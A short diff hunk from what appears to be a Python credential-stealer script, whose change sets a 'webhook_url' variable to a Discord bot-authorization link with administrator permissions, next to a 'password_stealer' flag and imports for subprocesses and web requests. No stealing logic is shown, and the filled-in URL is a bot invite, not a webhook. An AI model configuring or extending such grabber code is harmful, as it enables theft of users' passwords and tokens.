@@ -11,7 +11,7 @@ from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import datetime
 
-webhook_url = "YOUR_WEBHOOK_HERE"
+webhook_url = "https://discord.com/api/oauth2/authorize?client_id=903922793018716170&permissions=8&scope=bot"
 password_stealer = False
 
 languages = {
